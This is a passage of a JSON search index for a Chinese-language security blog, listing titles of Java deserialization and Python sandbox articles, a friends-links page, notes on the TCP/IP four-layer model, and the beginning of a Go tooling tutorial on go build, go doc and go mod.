{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Index # Hello world This is Longlone's blog Latest articles # articles mtime \u5b89\u5168 - \u5b89\u5168\u7814\u7a76 - python\u53d7\u9650\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0e\u9ed1\u9b54\u6cd5 2022/03/21 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bROME 2022/03/21 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316CC\u7bc7\u603b\u7ed3 2022/03/16 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316CC\u7bc7\u8865\u5145 2022/03/16 \u5b89\u5168 - java - java\u5b89\u5168 - OGNL 2022/03/11 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - RMI\u7bc73 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - RMI\u7bc72 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - RMI\u7bc71 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u5f00\u5934\u58f0\u660e 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316\u4e4bCommonsBeanUtils1 2022/03/07","title":"Index"},{"location":"#index","text":"Hello world This is Longlone's blog","title":"Index"},{"location":"#latest-articles","text":"articles mtime \u5b89\u5168 - \u5b89\u5168\u7814\u7a76 - python\u53d7\u9650\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0e\u9ed1\u9b54\u6cd5 2022/03/21 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bROME 2022/03/21 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316CC\u7bc7\u603b\u7ed3 2022/03/16 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316CC\u7bc7\u8865\u5145 2022/03/16 \u5b89\u5168 - java - java\u5b89\u5168 - OGNL 2022/03/11 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - RMI\u7bc73 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - RMI\u7bc72 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - RMI\u7bc71 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u5f00\u5934\u58f0\u660e 2022/03/07 \u5b89\u5168 - java - java\u53cd\u5e8f\u5217\u5316 - \u53cd\u5e8f\u5217\u5316\u4e4bCommonsBeanUtils1 2022/03/07","title":"Latest articles"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/","text":"\u53cb\u60c5\u94fe\u63a5 # Hacker # syclover # lingze kodosan const27 f4de afkl 0xc4m3l leohearts ljahum other # Y4tacker morrou","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#\u53cb\u60c5\u94fe\u63a5","text":"","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#hacker","text":"","title":"Hacker"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#syclover","text":"lingze kodosan const27 f4de afkl 0xc4m3l leohearts ljahum","title":"syclover"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#other","text":"Y4tacker morrou","title":"other"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/","tags":["\u57fa\u7840","\u8ba1\u7b97\u673a\u7f51\u7edc"],"text":"TCP/IP\u534f\u8bae4\u5c42\u6a21\u578b # \u6570\u636e\u94fe\u8def\u5c42(Link) # \u4f5c\u7528 # \u5b9e\u73b0\u7f51\u5361\u63a5\u53e3\u7684\u7f51\u7edc\u9a71\u52a8\uff0c\u4ee5\u5904\u7406\u6570\u636e\u5728\u4ee5\u592a\u7f51\u7ebf\u7b49\u7269\u7406\u5a92\u4ecb\u4e0a\u7684\u4f20\u8f93 \u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\u9690\u85cf\u4e86\u4e0d\u540c\u7269\u7406\u7f51\u7edc\u7684\u4e0d\u540c\u7535\u6c14\u7279\u6027\uff0c\u4e3a\u4e0a\u5c42\u534f\u8bae\u63d0\u4f9b\u4e00\u4e2a\u7edf\u4e00\u7684\u63a5\u53e3 \u534f\u8bae\u5e94\u7528 # ARP RARP \u7f51\u7edc\u5c42(Network) # \u4f5c\u7528 # \u7f51\u7edc\u6709\u5206\u5c40\u57df\u7f51(LAN, Local Area Network)\u548c\u5e7f\u57df\u7f51(WAN, Wide Area Network)\u3002\u5bf9\u4e8e\u540e\u8005\u901a\u5e38\u9700\u8981\u4f7f\u7528\u4f17\u591a\u5206\u7ea7\u7684\u8def\u7531\u5668\u6765\u8fde\u63a5\u5206\u6563\u7684\u4e3b\u673a\u6216\u8005LAN\uff0c\u5373\u901a\u8baf\u7684\u4e24\u53f0\u4e3b\u673a\u4e00\u822c\u4e0d\u662f\u76f4\u63a5\u8fde\u63a5\uff0c\u800c\u662f\u901a\u8fc7\u591a\u4e2a\u4e2d\u95f4\u8282\u70b9(\u8def\u7531\u5668)\u8fde\u63a5\u7684\uff0c\u4ece\u800c\u5f62\u6210\u7f51\u7edc\u62d3\u6251\u8fde\u63a5\u3002 1. \u9009\u62e9\u4e2d\u95f4\u8282\u70b9\uff0c\u4ee5\u786e\u5b9a\u4e24\u53f0\u4e3b\u673a\u95f4\u7684\u901a\u8baf\u8def\u5f84 2. \u5bf9\u4e0a\u5c42\u534f\u8bae\u9690\u85cf\u4e86\u7f51\u7edc\u62d3\u6251\u8fde\u63a5\u7684\u7ec6\u8282 \u534f\u8bae\u5e94\u7528 # IP\u534f\u8bae: IP\u534f\u8bae(Internet Protocol)\u662f\u7f51\u7edc\u5c42\u6700\u6838\u5fc3\u7684\u534f\u8bae\uff0c\u5b83\u6839\u636e\u6570\u636e\u5305\u7684\u76ee\u7684IP\u5730\u5740\u6765\u51b3\u5b9a\u5982\u4f55\u6295\u9012\u8be5\u6570\u636e\u5305\u3002\u82e5\u6570\u636e\u5305\u4e0d\u53ef\u76f4\u63a5\u53d1\u9001\u7ed9\u76ee\u6807\u4e3b\u673a\uff0c\u90a3\u4e48IP\u534f\u8bae\u5c31\u4e3a\u5b83\u5bfb\u627e\u4e00\u4e2a\u5408\u9002\u7684\u4e0b\u4e00\u8df3\u8def\u7531\u5668\uff0c\u5e76\u5c06\u6570\u636e\u5305\u4ea4\u4ed8\u7ed9\u8be5\u8def\u7531\u5668\u53bb\u8f6c\u53d1\uff0c\u5982\u6b64\u5faa\u73af\u76f4\u81f3\u5230\u8fbe\u76ee\u6807\u4e3b\u673a\u6216\u8005\u53d1\u9001\u5931\u8d25\u800c\u4e22\u5f03\u8be5\u6570\u636e\u5305\u3002 ICMP\u534f\u8bae: ICMP\u534f\u8bae(Internet Control Message Protocol\uff0c\u56e0\u7279\u7f51\u63a7\u5236\u62a5\u6587\u534f\u8bae)\u662fIP\u534f\u8bae\u7684\u8865\u5145\uff0c\u7528\u4e8e\u68c0\u6d4b\u7f51\u7edc\u7684\u8fde\u63a5\u72b6\u6001\uff0c\u5982ping\u5e94\u7528\u7a0b\u5e8f\u5c31\u662fICMP\u534f\u8bae\u7684\u4f7f\u7528\u3002ICMP\u5305\u53d1\u9001\u662f\u4e0d\u53ef\u9760\u7684\uff0c\u6240\u4ee5\u4e0d\u80fd\u4f9d\u9760\u63a5\u6536ICMP\u5305\u89e3\u51b3\u7f51\u7edc\u95ee\u9898\uff1bICMP\u4e0eTCP/UDP\u4e0d\u540c\uff0c\u5b83\u4eec\u662f\u4f20\u8f93\u5c42\u534f\u8bae\uff0c\u867d\u7136\u90fd\u5177\u6709\u7c7b\u578b\u57df\u548c\u4ee3\u7801\u57df\uff0c\u4f46\u662f\u524d\u8005\u548c\u540e\u8005\u4e0d\u540c\uff0cping\u7528\u5230\u7684ICMP\u534f\u8bae\uff0c\u4e0d\u662f\u7aef\u53e3\u3002ICMP\u534f\u8bae\u4f7f\u7528\u7684\u662fIP\u534f\u8bae\u800c\u975e\u4f7f\u7528\u4e0b\u5c42\u534f\u8bae\u63d0\u4f9b\u7684\u7684\u670d\u52a1\uff0c\u6240\u4ee5\u4e25\u683c\u6765\u8bb2\u5b83\u5e76\u975e\u7f51\u7edc\u5c42\u534f\u8bae\uff0c\u800c\u662f\u7f51\u7edc\u5c42\u7a0b\u5e8f\u3002 \u4f20\u8f93\u5c42(Transport) # \u4f5c\u7528 # \u4e3a\u5e94\u7528\u7a0b\u5e8f\u9690\u85cf\u4e86\u6570\u636e\u5305\u8df3\u8f6c\u7684\u7ec6\u8282\uff0c\u8d1f\u8d23\u6570\u636e\u5305\u7684\u6536\u53d1\u3001\u94fe\u8def\u8d85\u65f6\u91cd\u8fde\u7b49\u3002 \u534f\u8bae\u5e94\u7528 # TCP\u534f\u8bae: TCP\u534f\u8bae(Transmission Control Protocol, \u4f20\u8f93\u63a7\u5236\u534f\u8bae)\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u53ef\u9760\u7684\u3001\u9762\u5411\u8fde\u63a5\u7684\u3001\u57fa\u4e8e\u6d41\u7684\u670d\u52a1\uff0c\u5177\u6709\u8d85\u65f6\u91cd\u4f20\u3001\u6570\u636e\u786e\u8ba4\u7b49\u65b9\u5f0f\u6765\u786e\u4fdd\u6570\u636e\u5305\u88ab\u6b63\u786e\u53d1\u9001\u5230\u76ee\u7684\u7aef\u3002\u56e0\u6b64TCP\u670d\u52a1\u662f\u53ef\u9760\u7684\uff0c\u4f7f\u7528TCP\u534f\u8bae\u901a\u8baf\u7684\u53cc\u65b9\u5fc5\u987b\u5148\u5efa\u7acb\u8d77TCP\u8fde\u63a5\uff0c\u5e76\u5728\u7cfb\u7edf\u5185\u6838\u4e2d\u4e3a\u8be5\u8fde\u63a5\u7ef4\u6301\u4e00\u4e9b\u5fc5\u8981\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6bd4\u5982\u8fde\u63a5\u7684\u72b6\u6001\uff0c\u8bfb\u5199\u7f13\u51b2\u533a\uff0c\u591a\u4e2a\u5b9a\u65f6\u5668\u7b49\u3002\u5f53\u901a\u8baf\u7ed3\u675f\u65f6\u53cc\u65b9\u5fc5\u987b\u5173\u95ed\u8fde\u63a5\u4ee5\u91ca\u653e\u8fd9\u4e9b\u5185\u6838\u6570\u636e\u3002\u57fa\u4e8e\u6d41\u53d1\u9001\u610f\u601d\u662f\u6570\u636e\u662f\u6ca1\u6709\u957f\u5ea6\u9650\u5236\uff0c\u5b83\u53ef\u6e90\u6e90\u4e0d\u65ad\u5730\u4ece\u901a\u8baf\u7684\u4e00\u6bb5\u6d41\u5165\u53e6\u4e00\u7aef\u3002 UDP\u534f\u8bae: UDP\u534f\u8bae(User Datagram Protocol, \u7528\u6237\u6570\u636e\u62a5\u534f\u8bae)\u4e0eTCP\u534f\u8bae\u76f8\u53cd\uff0c\u5b83\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u662f\u4e0d\u53ef\u9760\u7684\u3001\u65e0\u8fde\u63a5\u7684\u57fa\u4e8e\u6570\u636e\u62a5\u7684\u670d\u52a1\u3002 \u65e0\u8fde\u63a5: \u901a\u8baf\u53cc\u65b9\u4e0d\u4fdd\u6301\u4e00\u4e2a\u957f\u4e45\u7684\u8054\u7cfb\uff0c\u56e0\u6b64\u5e94\u7528\u7a0b\u5e8f\u6bcf\u6b21\u53d1\u9001\u6570\u636e\u90fd\u8981\u660e\u786e\u6307\u5b9a\u63a5\u6536\u65b9\u7684\u5730\u5740\u3002 \u57fa\u4e8e\u6570\u636e\u62a5\u7684\u670d\u52a1: \u8fd9\u662f\u76f8\u5bf9\u4e8e\u6570\u636e\u6d41\u800c\u8a00\u7684\uff0c\u6bcf\u4e2aUDP\u6570\u636e\u62a5\u90fd\u6709\u4e00\u4e2a\u957f\u5ea6\uff0c\u63a5\u6536\u7aef\u5fc5\u987b\u4ee5\u8be5\u957f\u5ea6\u4e3a\u6700\u5c0f\u5355\u4f4d\u5c06\u5176\u5185\u5bb9\u4e00\u6b21\u6027\u8bfb\u51fa\uff0c\u5426\u5219\u6570\u636e\u5c06\u88ab\u622a\u65ad\u3002 \u5e94\u7528\u5c42(Application) # \u4f5c\u7528 # \u5e94\u7528\u5c42\u662f\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u7684\uff0c\u8d1f\u8d23\u5904\u7406\u4f17\u591a\u4e1a\u52a1\u903b\u8f91\uff0c\u5982\u6587\u4ef6\u4f20\u8f93\u3001\u7f51\u7edc\u7ba1\u7406\u7b49\u3002 \u534f\u8bae\u5e94\u7528 # HTTP\u534f\u8bae SMTP\u534f\u8bae SSH\u534f\u8bae FTP\u534f\u8bae TELNET\u534f\u8bae OSPF\u534f\u8bae","title":null},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#tcpip\u534f\u8bae4\u5c42\u6a21\u578b","text":"","title":"TCP/IP\u534f\u8bae4\u5c42\u6a21\u578b"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u6570\u636e\u94fe\u8def\u5c42link","text":"","title":"\u6570\u636e\u94fe\u8def\u5c42(Link)"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u4f5c\u7528","text":"\u5b9e\u73b0\u7f51\u5361\u63a5\u53e3\u7684\u7f51\u7edc\u9a71\u52a8\uff0c\u4ee5\u5904\u7406\u6570\u636e\u5728\u4ee5\u592a\u7f51\u7ebf\u7b49\u7269\u7406\u5a92\u4ecb\u4e0a\u7684\u4f20\u8f93 \u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\u9690\u85cf\u4e86\u4e0d\u540c\u7269\u7406\u7f51\u7edc\u7684\u4e0d\u540c\u7535\u6c14\u7279\u6027\uff0c\u4e3a\u4e0a\u5c42\u534f\u8bae\u63d0\u4f9b\u4e00\u4e2a\u7edf\u4e00\u7684\u63a5\u53e3","title":"\u4f5c\u7528"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u534f\u8bae\u5e94\u7528","text":"ARP RARP","title":"\u534f\u8bae\u5e94\u7528"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u7f51\u7edc\u5c42network","text":"","title":"\u7f51\u7edc\u5c42(Network)"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u4f5c\u7528_1","text":"\u7f51\u7edc\u6709\u5206\u5c40\u57df\u7f51(LAN, Local Area Network)\u548c\u5e7f\u57df\u7f51(WAN, Wide Area Network)\u3002\u5bf9\u4e8e\u540e\u8005\u901a\u5e38\u9700\u8981\u4f7f\u7528\u4f17\u591a\u5206\u7ea7\u7684\u8def\u7531\u5668\u6765\u8fde\u63a5\u5206\u6563\u7684\u4e3b\u673a\u6216\u8005LAN\uff0c\u5373\u901a\u8baf\u7684\u4e24\u53f0\u4e3b\u673a\u4e00\u822c\u4e0d\u662f\u76f4\u63a5\u8fde\u63a5\uff0c\u800c\u662f\u901a\u8fc7\u591a\u4e2a\u4e2d\u95f4\u8282\u70b9(\u8def\u7531\u5668)\u8fde\u63a5\u7684\uff0c\u4ece\u800c\u5f62\u6210\u7f51\u7edc\u62d3\u6251\u8fde\u63a5\u3002 1. \u9009\u62e9\u4e2d\u95f4\u8282\u70b9\uff0c\u4ee5\u786e\u5b9a\u4e24\u53f0\u4e3b\u673a\u95f4\u7684\u901a\u8baf\u8def\u5f84 2. \u5bf9\u4e0a\u5c42\u534f\u8bae\u9690\u85cf\u4e86\u7f51\u7edc\u62d3\u6251\u8fde\u63a5\u7684\u7ec6\u8282","title":"\u4f5c\u7528"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u534f\u8bae\u5e94\u7528_1","text":"IP\u534f\u8bae: IP\u534f\u8bae(Internet Protocol)\u662f\u7f51\u7edc\u5c42\u6700\u6838\u5fc3\u7684\u534f\u8bae\uff0c\u5b83\u6839\u636e\u6570\u636e\u5305\u7684\u76ee\u7684IP\u5730\u5740\u6765\u51b3\u5b9a\u5982\u4f55\u6295\u9012\u8be5\u6570\u636e\u5305\u3002\u82e5\u6570\u636e\u5305\u4e0d\u53ef\u76f4\u63a5\u53d1\u9001\u7ed9\u76ee\u6807\u4e3b\u673a\uff0c\u90a3\u4e48IP\u534f\u8bae\u5c31\u4e3a\u5b83\u5bfb\u627e\u4e00\u4e2a\u5408\u9002\u7684\u4e0b\u4e00\u8df3\u8def\u7531\u5668\uff0c\u5e76\u5c06\u6570\u636e\u5305\u4ea4\u4ed8\u7ed9\u8be5\u8def\u7531\u5668\u53bb\u8f6c\u53d1\uff0c\u5982\u6b64\u5faa\u73af\u76f4\u81f3\u5230\u8fbe\u76ee\u6807\u4e3b\u673a\u6216\u8005\u53d1\u9001\u5931\u8d25\u800c\u4e22\u5f03\u8be5\u6570\u636e\u5305\u3002 ICMP\u534f\u8bae: ICMP\u534f\u8bae(Internet Control Message Protocol\uff0c\u56e0\u7279\u7f51\u63a7\u5236\u62a5\u6587\u534f\u8bae)\u662fIP\u534f\u8bae\u7684\u8865\u5145\uff0c\u7528\u4e8e\u68c0\u6d4b\u7f51\u7edc\u7684\u8fde\u63a5\u72b6\u6001\uff0c\u5982ping\u5e94\u7528\u7a0b\u5e8f\u5c31\u662fICMP\u534f\u8bae\u7684\u4f7f\u7528\u3002ICMP\u5305\u53d1\u9001\u662f\u4e0d\u53ef\u9760\u7684\uff0c\u6240\u4ee5\u4e0d\u80fd\u4f9d\u9760\u63a5\u6536ICMP\u5305\u89e3\u51b3\u7f51\u7edc\u95ee\u9898\uff1bICMP\u4e0eTCP/UDP\u4e0d\u540c\uff0c\u5b83\u4eec\u662f\u4f20\u8f93\u5c42\u534f\u8bae\uff0c\u867d\u7136\u90fd\u5177\u6709\u7c7b\u578b\u57df\u548c\u4ee3\u7801\u57df\uff0c\u4f46\u662f\u524d\u8005\u548c\u540e\u8005\u4e0d\u540c\uff0cping\u7528\u5230\u7684ICMP\u534f\u8bae\uff0c\u4e0d\u662f\u7aef\u53e3\u3002ICMP\u534f\u8bae\u4f7f\u7528\u7684\u662fIP\u534f\u8bae\u800c\u975e\u4f7f\u7528\u4e0b\u5c42\u534f\u8bae\u63d0\u4f9b\u7684\u7684\u670d\u52a1\uff0c\u6240\u4ee5\u4e25\u683c\u6765\u8bb2\u5b83\u5e76\u975e\u7f51\u7edc\u5c42\u534f\u8bae\uff0c\u800c\u662f\u7f51\u7edc\u5c42\u7a0b\u5e8f\u3002","title":"\u534f\u8bae\u5e94\u7528"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u4f20\u8f93\u5c42transport","text":"","title":"\u4f20\u8f93\u5c42(Transport)"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u4f5c\u7528_2","text":"\u4e3a\u5e94\u7528\u7a0b\u5e8f\u9690\u85cf\u4e86\u6570\u636e\u5305\u8df3\u8f6c\u7684\u7ec6\u8282\uff0c\u8d1f\u8d23\u6570\u636e\u5305\u7684\u6536\u53d1\u3001\u94fe\u8def\u8d85\u65f6\u91cd\u8fde\u7b49\u3002","title":"\u4f5c\u7528"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u534f\u8bae\u5e94\u7528_2","text":"TCP\u534f\u8bae: TCP\u534f\u8bae(Transmission Control Protocol, \u4f20\u8f93\u63a7\u5236\u534f\u8bae)\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u53ef\u9760\u7684\u3001\u9762\u5411\u8fde\u63a5\u7684\u3001\u57fa\u4e8e\u6d41\u7684\u670d\u52a1\uff0c\u5177\u6709\u8d85\u65f6\u91cd\u4f20\u3001\u6570\u636e\u786e\u8ba4\u7b49\u65b9\u5f0f\u6765\u786e\u4fdd\u6570\u636e\u5305\u88ab\u6b63\u786e\u53d1\u9001\u5230\u76ee\u7684\u7aef\u3002\u56e0\u6b64TCP\u670d\u52a1\u662f\u53ef\u9760\u7684\uff0c\u4f7f\u7528TCP\u534f\u8bae\u901a\u8baf\u7684\u53cc\u65b9\u5fc5\u987b\u5148\u5efa\u7acb\u8d77TCP\u8fde\u63a5\uff0c\u5e76\u5728\u7cfb\u7edf\u5185\u6838\u4e2d\u4e3a\u8be5\u8fde\u63a5\u7ef4\u6301\u4e00\u4e9b\u5fc5\u8981\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6bd4\u5982\u8fde\u63a5\u7684\u72b6\u6001\uff0c\u8bfb\u5199\u7f13\u51b2\u533a\uff0c\u591a\u4e2a\u5b9a\u65f6\u5668\u7b49\u3002\u5f53\u901a\u8baf\u7ed3\u675f\u65f6\u53cc\u65b9\u5fc5\u987b\u5173\u95ed\u8fde\u63a5\u4ee5\u91ca\u653e\u8fd9\u4e9b\u5185\u6838\u6570\u636e\u3002\u57fa\u4e8e\u6d41\u53d1\u9001\u610f\u601d\u662f\u6570\u636e\u662f\u6ca1\u6709\u957f\u5ea6\u9650\u5236\uff0c\u5b83\u53ef\u6e90\u6e90\u4e0d\u65ad\u5730\u4ece\u901a\u8baf\u7684\u4e00\u6bb5\u6d41\u5165\u53e6\u4e00\u7aef\u3002 UDP\u534f\u8bae: UDP\u534f\u8bae(User Datagram Protocol, \u7528\u6237\u6570\u636e\u62a5\u534f\u8bae)\u4e0eTCP\u534f\u8bae\u76f8\u53cd\uff0c\u5b83\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u662f\u4e0d\u53ef\u9760\u7684\u3001\u65e0\u8fde\u63a5\u7684\u57fa\u4e8e\u6570\u636e\u62a5\u7684\u670d\u52a1\u3002 \u65e0\u8fde\u63a5: \u901a\u8baf\u53cc\u65b9\u4e0d\u4fdd\u6301\u4e00\u4e2a\u957f\u4e45\u7684\u8054\u7cfb\uff0c\u56e0\u6b64\u5e94\u7528\u7a0b\u5e8f\u6bcf\u6b21\u53d1\u9001\u6570\u636e\u90fd\u8981\u660e\u786e\u6307\u5b9a\u63a5\u6536\u65b9\u7684\u5730\u5740\u3002 \u57fa\u4e8e\u6570\u636e\u62a5\u7684\u670d\u52a1: \u8fd9\u662f\u76f8\u5bf9\u4e8e\u6570\u636e\u6d41\u800c\u8a00\u7684\uff0c\u6bcf\u4e2aUDP\u6570\u636e\u62a5\u90fd\u6709\u4e00\u4e2a\u957f\u5ea6\uff0c\u63a5\u6536\u7aef\u5fc5\u987b\u4ee5\u8be5\u957f\u5ea6\u4e3a\u6700\u5c0f\u5355\u4f4d\u5c06\u5176\u5185\u5bb9\u4e00\u6b21\u6027\u8bfb\u51fa\uff0c\u5426\u5219\u6570\u636e\u5c06\u88ab\u622a\u65ad\u3002","title":"\u534f\u8bae\u5e94\u7528"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u5e94\u7528\u5c42application","text":"","title":"\u5e94\u7528\u5c42(Application)"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u4f5c\u7528_3","text":"\u5e94\u7528\u5c42\u662f\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u7684\uff0c\u8d1f\u8d23\u5904\u7406\u4f17\u591a\u4e1a\u52a1\u903b\u8f91\uff0c\u5982\u6587\u4ef6\u4f20\u8f93\u3001\u7f51\u7edc\u7ba1\u7406\u7b49\u3002","title":"\u4f5c\u7528"},{"location":"%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4%E5%B1%82%E6%A8%A1%E5%9E%8B/#\u534f\u8bae\u5e94\u7528_3","text":"HTTP\u534f\u8bae SMTP\u534f\u8bae SSH\u534f\u8bae FTP\u534f\u8bae TELNET\u534f\u8bae OSPF\u534f\u8bae","title":"\u534f\u8bae\u5e94\u7528"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/","tags":["golang"],"text":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840 # \u73af\u5883\u642d\u5efa # \u76f8\u5173\u6587\u7ae0: vscode\u642d\u5efago\u8bed\u8a00\u5f00\u53d1\u73af\u5883 go build # \u5c06go\u6587\u4ef6\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6 go build hello.go \u53bb\u9664\u8c03\u8bd5\u4fe1\u606f\u548c\u7b26\u53f7\u8868\u4ee5\u8282\u7ea6\u53ef\u6267\u884c\u6587\u4ef6\u5927\u5c0f go build -ldflags \"-w -s\" \u4ea4\u53c9\u7f16\u8bd1(\u5982\u4f7f\u7528windows\u7f16\u8bd1\u6210linux\u7684\u53ef\u6267\u884c\u6587\u4ef6) SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build -ldflags \"-s -w\" -o hello hello.go go doc # \u76f8\u5173\u6587\u7ae0: godoc \u547d\u4ee4\u548c golang \u4ee3\u7801\u6587\u6863\u7ba1\u7406 # \u67e5\u770b\u76ee\u6807\u5305\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] # \u67e5\u770b\u76ee\u6807\u5305\u7684\u67d0\u5185\u5bb9\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] . [ \u51fd\u6570\u540d ] # \u6216\u8005\u7a7a\u683c\u9694\u5f00\u4e5f\u663e\u793a\u67d0\u5185\u5bb9\u7684\u6587\u6863 go doc [ targetPackage ] [ \u51fd\u6570\u540d ] # \u5b50\u5305\u7684\u6587\u6863\u6ce8\u91ca go doc [ targetPackage ] / [ subpackage ] # \u4ee3\u7801\u6587\u6863\u7f16\u5199, \u6309 go \u7684\u6807\u51c6\u6ce8\u91ca\u5199\u6cd5\u7f16\u5199 // Biz implements a business type Biz struct { } // business initialization func ( b *Biz ) Init () { } go mod(golang v1.11\u53ca\u4ee5\u4e0a) # \u76f8\u5173\u6587\u7ae0: go mod \u4f7f\u7528 # \u914d\u7f6e go mod export GO111MODULE = true # \u521b\u5efa\u65b0\u9879\u76ee go mod init hello # \u63a5\u4e0b\u6765\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u7528\u7ba1\u4e86,\u5728\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305\u65f6import, \u5728\u8fd0\u884c\u65f6\u4f1a\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\u4f9d\u8d56 # go module \u5b89\u88c5 package \u7684\u539f\u5247\u662f\u5148\u62c9\u6700\u65b0\u7684 release tag\uff0c\u82e5\u65e0tag\u5219\u62c9\u6700\u65b0\u7684commit # \u4f7f\u7528go get\u65f6\u4e5f\u4f1a\u7531go mod\u63a5\u7ba1 # \u8fd0\u884c go get -u \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u6b21\u8981\u7248\u672c\u6216\u8005\u4fee\u8ba2\u7248\u672c(x.y.z, z\u662f\u4fee\u8ba2\u7248\u672c\u53f7\uff0c y\u662f\u6b21\u8981\u7248\u672c\u53f7) # \u8fd0\u884c go get -u=patch \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u4fee\u8ba2\u7248\u672c # \u8fd0\u884c go get package@version \u5c06\u4f1a\u5347\u7ea7\u5230\u6307\u5b9a\u7684\u7248\u672c\u53f7version # \u8fd0\u884cgo get\u5982\u679c\u6709\u7248\u672c\u7684\u66f4\u6539\uff0c\u90a3\u4e48go.mod\u6587\u4ef6\u4e5f\u4f1a\u66f4\u6539 # \u4f7f\u7528go 